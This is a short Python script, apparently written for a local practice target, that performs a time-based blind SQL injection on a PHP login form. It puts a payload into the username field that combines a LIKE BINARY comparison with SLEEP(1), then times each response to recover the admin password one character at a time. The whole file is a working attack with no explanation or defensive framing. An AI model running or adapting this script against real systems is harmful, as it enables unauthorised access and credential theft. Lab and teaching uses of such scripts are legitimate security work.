import requests, sys

print("")
def print_progress(output):
  OKBLUE = '\033[94m'
  ENDC = '\033[0m'
  sys.stdout.write(f"\rCurrent guess: {OKBLUE}{output}{ENDC}")
  sys.stdout.flush()


CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!-#?"
BASE_URL = "http://hampus.local/index_like.php"
HEADERS = {
  'Content-type': 'application/x-www-form-urlencoded'
}

def call(guess):
  delay = 1
  username = "admin'"
  injection = f" AND password LIKE BINARY '{guess}%' AND SLEEP({delay}) -- " 

  response  = requests.post(BASE_URL, data = {'username': f'{username}{injection}'})

  return response




password_builder = ''
previous_guess = ''
while True:
  previous_guess = password_builder

  for char in CHARACTERS:
    response = call(f"{password_builder}{char}")

    if response.elapsed.seconds >= 1:
      password_builder = password_builder + char

  if previous_guess == password_builder:
    break

  print_progress(password_builder)


